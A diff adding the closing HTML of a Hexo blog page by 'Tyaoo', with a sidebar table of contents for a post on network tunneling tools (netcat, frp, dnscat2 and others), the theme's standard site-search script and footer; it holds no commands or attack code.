+              <p class="site-author-name" itemprop="name">Tyaoo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tyaoo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前置知识"><span class="nav-number">1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境"><span class="nav-number">2.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络层"><span class="nav-number">3.</span> <span class="nav-text">网络层</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#icmpsh"><span class="nav-number">3.1.</span> <span class="nav-text">icmpsh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#icmptunnel"><span class="nav-number">3.2.</span> <span class="nav-text">icmptunnel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pingtunnel"><span class="nav-number">3.3.</span> <span class="nav-text">pingtunnel</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传输层"><span class="nav-number">4.</span> <span class="nav-text">传输层</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#netcat"><span class="nav-number">4.1.</span> <span class="nav-text">netcat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powercat"><span class="nav-number">4.2.</span> <span class="nav-text">powercat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#socat"><span class="nav-number">4.3.</span> <span class="nav-text">socat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#netsh"><span class="nav-number">4.4.</span> <span class="nav-text">netsh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lcx"><span class="nav-number">4.5.</span> <span class="nav-text">lcx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NATBypass"><span class="nav-number">4.6.</span> <span class="nav-text">NATBypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iox"><span class="nav-number">4.7.</span> <span class="nav-text">iox</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#应用层"><span class="nav-number">5.</span> <span class="nav-text">应用层</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EarthWorm"><span class="nav-number">5.1.</span> <span class="nav-text">EarthWorm</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Neo-reGeorg"><span class="nav-number">5.2.</span> <span class="nav-text">Neo-reGeorg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#venom"><span class="nav-number">5.3.</span> <span class="nav-text">venom</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssf"><span class="nav-number">5.4.</span> <span class="nav-text">ssf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#frp"><span class="nav-number">5.5.</span> <span class="nav-text">frp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nps"><span class="nav-number">5.6.</span> <span class="nav-text">nps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnscat2"><span class="nav-number">5.7.</span> <span class="nav-text">dnscat2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnscat2-powershell"><span class="nav-number">5.8.</span> <span class="nav-text">dnscat2-powershell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dns2tcp"><span class="nav-number">5.9.</span> <span class="nav-text">dns2tcp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iodine"><span class="nav-number">5.10.</span> <span class="nav-text">iodine</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reDuh"><span class="nav-number">5.11.</span> <span class="nav-text">reDuh</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tunna"><span class="nav-number">5.12.</span> <span class="nav-text">Tunna</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ABPTTS"><span class="nav-number">5.13.</span> <span class="nav-text">ABPTTS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Termite"><span class="nav-number">5.14.</span> <span class="nav-text">Termite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssocks"><span class="nav-number">5.15.</span> <span class="nav-text">ssocks</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#s5-go"><span class="nav-number">5.16.</span> <span class="nav-text">s5.go</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bridge"><span class="nav-number">5.17.</span> <span class="nav-text">bridge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh"><span class="nav-number">5.18.</span> <span class="nav-text">ssh</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tyaoo</span>
+
+  
+</div>
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
